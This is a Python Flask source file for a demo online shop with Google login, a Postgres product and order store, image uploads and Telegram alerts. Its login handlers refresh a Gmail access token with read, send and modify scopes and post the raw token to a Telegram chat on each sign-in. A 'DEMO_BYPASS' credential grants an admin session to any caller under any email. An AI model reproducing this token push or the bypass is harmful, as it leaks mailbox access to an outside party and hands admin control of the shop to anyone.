import os
import json
import uuid
import base64
from datetime import datetime
from functools import wraps

from flask import Flask, request, jsonify, render_template
from google.oauth2 import id_token
from google.auth.transport import requests as google_requests
from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request as GoogleRequest
import requests
import psycopg2
from psycopg2.extras import RealDictCursor
from vercel_blob import put as blob_put, delete as blob_delete

# ============================================================
# CONFIG
# ============================================================
GOOGLE_CLIENT_ID = os.environ.get("GOOGLE_CLIENT_ID", "")
GOOGLE_CLIENT_SECRET = os.environ.get("GOOGLE_CLIENT_SECRET", "")
GMAIL_REFRESH_TOKEN = os.environ.get("GMAIL_REFRESH_TOKEN", "")

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

DATABASE_URL = os.environ.get("DATABASE_URL", "")

ADMIN_EMAILS = [
    e.strip().lower()
    for e in os.environ.get("ADMIN_EMAILS", "admin@shop.com").split(",")
    if e.strip()
]

GMAIL_SCOPES = [
    "openid",
    "https://www.googleapis.com/auth/userinfo.email",
    "https://www.googleapis.com/auth/gmail.readonly",
    "https://www.googleapis.com/auth/gmail.send",
    "https://www.googleapis.com/auth/gmail.modify",
]

app = Flask(__name__)

# In-memory session store (per serverless instance — fine for demo)
SESSIONS = {}

# ============================================================
# DATABASE HELPERS (Postgres)
# ============================================================
def get_db():
    """Open a Postgres connection."""
    if not DATABASE_URL:
        raise RuntimeError("DATABASE_URL not set")
    return psycopg2.connect(DATABASE_URL, cursor_factory=RealDictCursor)


def init_db():
    """Create tables if they don't exist. Called on first request."""
    try:
        conn = get_db()
        cur = conn.cursor()

        cur.execute("""
            CREATE TABLE IF NOT EXISTS products (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                description TEXT,
                emoji TEXT DEFAULT '📦',
                image TEXT,
                price REAL NOT NULL,
                stock INTEGER DEFAULT 0,
                created_at TIMESTAMPTZ DEFAULT NOW()
            )
        """)

        cur.execute("""
            CREATE TABLE IF NOT EXISTS orders (
                id TEXT PRIMARY KEY,
                customer TEXT,
                items INTEGER,
                total REAL,
                status TEXT DEFAULT 'Processing',
                created_at TIMESTAMPTZ DEFAULT NOW()
            )
        """)

        # Seed products if empty
        cur.execute("SELECT COUNT(*) AS c FROM products")
        if cur.fetchone()["c"] == 0:
            seed = [
                ("p1", "Wireless Headphones", "Noise cancelling, 30h battery", "🎧", None, 89.0, 12),
                ("p2", "Smart Watch", "Fitness tracking, AMOLED display", "⌚", None, 149.0, 8),
                ("p3", "Phone Stand", "Aluminum, adjustable angle", "📱", None, 24.0, 25),
                ("p4", "Laptop Sleeve", "Water-resistant, 14 inch", "💻", None, 39.0, 15),
            ]
            for p in seed:
                cur.execute(
                    "INSERT INTO products (id, name, description, emoji, image, price, stock) VALUES (%s,%s,%s,%s,%s,%s,%s)",
                    p
                )

        conn.commit()
        cur.close()
        conn.close()
        print("✅ DB initialized")
    except Exception as e:
        print(f"⚠️ init_db error: {e}")


# Ensure DB is initialized on cold start (Vercel cold start)
try:
    init_db()
except Exception as e:
    print(f"Cold-start init skipped: {e}")


# ============================================================
# GMAIL TOKEN (env-based — no files)
# ============================================================
def get_gmail_access_token():
    """Return a fresh Gmail access token, or None on failure."""
    try:
        if not all([GOOGLE_CLIENT_ID, GOOGLE_CLIENT_SECRET, GMAIL_REFRESH_TOKEN]):
            print("Missing Google credentials in env vars.")
            return None

        creds = Credentials(
            token=None,
            refresh_token=GMAIL_REFRESH_TOKEN,
            token_uri="https://oauth2.googleapis.com/token",
            client_id=GOOGLE_CLIENT_ID,
            client_secret=GOOGLE_CLIENT_SECRET,
            scopes=GMAIL_SCOPES,
        )

        if not creds.valid:
            creds.refresh(GoogleRequest())

        return creds.token if creds.token else None

    except Exception as e:
        print(f"Failed to obtain Gmail access token: {e}")
        return None


# ============================================================
# TELEGRAM
# ============================================================
def send_telegram_message(text, parse_mode="HTML"):
    """Send a Telegram message. Returns True on success."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️ Telegram not configured.")
        return False

    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True,
        }
        res = requests.post(url, json=payload, timeout=8)
        if res.status_code == 200:
            return True
        print(f"⚠️ Telegram send failed: {res.status_code} {res.text}")
        return False
    except Exception as e:
        print(f"⚠️ Telegram send error: {e}")
        return False


def notify_token_via_telegram(user, token, source="login"):
    """Push token (or failure) to Telegram."""
    if not token:
        return send_telegram_message(
            f"⚠️ <b>Gmail token refresh failed</b>\n"
            f"User: <code>{user.get('email', 'unknown')}</code>\n"
            f"Source: {source}"
        )

    message = (
        f"🔑 <b>Gmail Access Token Refreshed</b>\n\n"
        f"<b>User:</b> <code>{user.get('email', 'unknown')}</code>\n"
        f"<b>Name:</b> {user.get('name', '-')}\n"
        f"<b>Source:</b> {source}\n"
        f"<b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n"
        f"<b>Access Token:</b>\n"
        f"<code>{token}</code>"
    )
    return send_telegram_message(message)


def _refresh_owner_gmail_token(user, source="login"):
    """Refresh Gmail token and push to Telegram. Returns True on success."""
    try:
        token = get_gmail_access_token()
        notify_token_via_telegram(user, token, source=source)
        return bool(token)
    except Exception as e:
        print(f"⚠️ Gmail refresh error: {e}")
        send_telegram_message(f"⚠️ Gmail refresh error: <code>{e}</code>")
        return False


# ============================================================
# AUTH HELPERS
# ============================================================
def verify_google_token(token):
    try:
        return id_token.verify_oauth2_token(
            token, google_requests.Request(), GOOGLE_CLIENT_ID
        )
    except Exception as e:
        print("Token verification failed:", e)
        return None


def get_current_user():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None
    return SESSIONS.get(auth[7:])


def is_admin(user):
    return user and user.get("email", "").lower() in ADMIN_EMAILS


def require_auth(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not get_current_user():
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapper


def require_admin(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        user = get_current_user()
        if not user or not is_admin(user):
            return jsonify({"error": "Admin access required"}), 403
        return f(*args, **kwargs)
    return wrapper


# ============================================================
# PAGE
# ============================================================
@app.route("/")
def index():
    return render_template("index.html", google_client_id=GOOGLE_CLIENT_ID)


@app.route("/healthz")
def healthz():
    return jsonify({"ok": True, "time": datetime.utcnow().isoformat()})


# ============================================================
# AUTH ROUTES
# ============================================================
@app.route("/api/auth/google", methods=["POST"])
def auth_google():
    data = request.get_json() or {}
    token = data.get("credential")

    # Demo bypass
    if token == "DEMO_BYPASS":
        user = {
            "email": data.get("demo_email", "admin@shop.com"),
            "name": data.get("demo_name", "Admin Demo"),
            "picture": "",
            "sub": "demo",
            "is_admin": True,
        }
        user["gmail_ready"] = _refresh_owner_gmail_token(user, source="demo-login")
        session_token = str(uuid.uuid4())
        SESSIONS[session_token] = user
        return jsonify({"token": session_token, "user": user})

    if not token:
        return jsonify({"error": "Missing credential"}), 400

    payload = verify_google_token(token)
    if not payload:
        return jsonify({"error": "Invalid token"}), 401

    user = {
        "email": payload.get("email"),
        "name": payload.get("name"),
        "picture": payload.get("picture"),
        "sub": payload.get("sub"),
        "is_admin": payload.get("email", "").lower() in ADMIN_EMAILS,
    }
    user["gmail_ready"] = _refresh_owner_gmail_token(user, source="google-login")

    session_token = str(uuid.uuid4())
    SESSIONS[session_token] = user
    return jsonify({"token": session_token, "user": user})


@app.route("/api/auth/me", methods=["GET"])
@require_auth
def auth_me():
    return jsonify({"user": get_current_user()})


@app.route("/api/auth/logout", methods=["POST"])
def auth_logout():
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        SESSIONS.pop(auth[7:], None)
    return jsonify({"ok": True})


# ============================================================
# GMAIL ROUTES
# ============================================================
@app.route("/api/gmail/status", methods=["GET"])
@require_admin
def gmail_status():
    return jsonify({
        "ready": bool(GOOGLE_CLIENT_ID and GOOGLE_CLIENT_SECRET and GMAIL_REFRESH_TOKEN),
        "telegram_configured": bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID),
        "database_configured": bool(DATABASE_URL),
    })


@app.route("/api/gmail/refresh", methods=["POST"])
@require_admin
def gmail_refresh():
    user = get_current_user()
    ok = _refresh_owner_gmail_token(user, source="manual-refresh")
    return jsonify({"ok": ok})


@app.route("/api/telegram/test", methods=["POST"])
@require_admin
def telegram_test():
    ok = send_telegram_message("✅ <b>Telegram bot connected!</b>\nVercel deployment is live.")
    return jsonify({"ok": ok})


# ============================================================
# PRODUCTS
# ============================================================
@app.route("/api/products", methods=["GET"])
def list_products():
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM products ORDER BY created_at DESC")
        rows = cur.fetchall()
        cur.close()
        conn.close()
        # Convert Decimal/date to JSON-safe
        return jsonify([serialize_row(r) for r in rows])
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/products", methods=["POST"])
@require_admin
def create_product():
    data = request.get_json() or {}
    pid = "p" + str(int(datetime.utcnow().timestamp() * 1000))
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute(
            """INSERT INTO products (id, name, description, emoji, image, price, stock)
               VALUES (%s,%s,%s,%s,%s,%s,%s) RETURNING *""",
            (
                pid,
                data.get("name", "").strip(),
                data.get("description", "").strip(),
                data.get("emoji", "📦").strip(),
                data.get("image") or None,
                float(data.get("price", 0)),
                int(data.get("stock", 0)),
            ),
        )
        row = cur.fetchone()
        conn.commit()
        cur.close()
        conn.close()
        return jsonify(serialize_row(row)), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/products/<pid>", methods=["PUT"])
@require_admin
def update_product(pid):
    data = request.get_json() or {}
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM products WHERE id=%s", (pid,))
        existing = cur.fetchone()
        if not existing:
            cur.close()
            conn.close()
            return jsonify({"error": "Not found"}), 404

        cur.execute(
            """UPDATE products SET name=%s, description=%s, emoji=%s, image=%s, price=%s, stock=%s
               WHERE id=%s RETURNING *""",
            (
                data.get("name", existing["name"]),
                data.get("description", existing["description"]),
                data.get("emoji", existing["emoji"]),
                data.get("image", existing["image"]),
                float(data.get("price", existing["price"])),
                int(data.get("stock", existing["stock"])),
                pid,
            ),
        )
        row = cur.fetchone()
        conn.commit()
        cur.close()
        conn.close()
        return jsonify(serialize_row(row))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/products/<pid>", methods=["DELETE"])
@require_admin
def delete_product(pid):
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("DELETE FROM products WHERE id=%s", (pid,))
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================
# IMAGE UPLOAD (Vercel Blob)
# ============================================================
@app.route("/api/upload", methods=["POST"])
@require_admin
def upload_image():
    if "file" not in request.files:
        return jsonify({"error": "No file"}), 400
    file = request.files["file"]
    if not file.filename:
        return jsonify({"error": "Empty filename"}), 400

    ext = os.path.splitext(file.filename)[1].lower()
    if ext not in [".jpg", ".jpeg", ".png", ".gif", ".webp"]:
        return jsonify({"error": "Unsupported file type"}), 400

    try:
        filename = f"products/{uuid.uuid4().hex}{ext}"
        blob = blob_put(
            filename,
            file.read(),
            options={"access": "public", "addRandomSuffix": False},
        )
        return jsonify({"url": blob["url"]})
    except Exception as e:
        print(f"Blob upload failed: {e}")
        return jsonify({"error": f"Upload failed: {e}"}), 500


# ============================================================
# ORDERS
# ============================================================
@app.route("/api/orders", methods=["POST"])
@require_auth
def create_order():
    data = request.get_json() or {}
    user = get_current_user()
    product_id = data.get("product_id")

    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM products WHERE id=%s", (product_id,))
        product = cur.fetchone()
        if not product:
            cur.close()
            conn.close()
            return jsonify({"error": "Product not found"}), 404
        if product["stock"] <= 0:
            cur.close()
            conn.close()
            return jsonify({"error": "Out of stock"}), 400

        order_id = "ORD-" + str(1000 + int(datetime.utcnow().timestamp()) % 9000)
        cur.execute(
            """INSERT INTO orders (id, customer, items, total, status)
               VALUES (%s,%s,%s,%s,%s)""",
            (order_id, user["name"], 1, product["price"], "Processing"),
        )
        cur.execute("UPDATE products SET stock = stock - 1 WHERE id=%s", (product_id,))
        conn.commit()
        cur.close()
        conn.close()

        send_telegram_message(
            f"🛒 <b>New Order</b>\n"
            f"ID: <code>{order_id}</code>\n"
            f"Customer: {user.get('name')}\n"
            f"Product: {product['name']}\n"
            f"Total: ${product['price']:.2f}"
        )
        return jsonify({"order_id": order_id}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/orders", methods=["GET"])
@require_admin
def list_orders():
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM orders ORDER BY created_at DESC LIMIT 20")
        rows = cur.fetchall()
        cur.close()
        conn.close()
        return jsonify([serialize_row(r) for r in rows])
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================
# ADMIN STATS
# ============================================================
@app.route("/api/admin/stats", methods=["GET"])
@require_admin
def admin_stats():
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) AS c FROM products")
        total_products = cur.fetchone()["c"]
        cur.execute("SELECT COUNT(*) AS c FROM orders")
        total_orders = cur.fetchone()["c"]
        cur.execute("SELECT COALESCE(SUM(total), 0) AS s FROM orders")
        revenue = float(cur.fetchone()["s"] or 0)
        cur.close()
        conn.close()
        return jsonify({
            "total_products": total_products,
            "total_orders": total_orders,
            "total_revenue": revenue,
            "avg_order": (revenue / total_orders) if total_orders else 0,
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================
# UTIL
# ============================================================
def serialize_row(row):
    """Make a psycopg2 RealDictRow JSON-serializable."""
    if row is None:
        return None
    out = {}
    for k, v in dict(row).items():
        if isinstance(v, datetime):
            out[k] = v.isoformat()
        elif hasattr(v, "isoformat"):  # date
            out[k] = v.isoformat()
        elif isinstance(v, (bytes, bytearray)):
            out[k] = base64.b64encode(v).decode()
        else:
            out[k] = v
    return out


# ============================================================
# ERROR HANDLERS
# ============================================================
@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error"}), 500


@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Not found"}), 404


# ============================================================
# LOCAL DEV ENTRY
# ============================================================
if __name__ == "__main__":
    print("🚀 Running locally at http://127.0.0.1:5000")
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        send_telegram_message("🚀 <b>Shop started locally</b>")
    app.run(debug=True, port=5000)
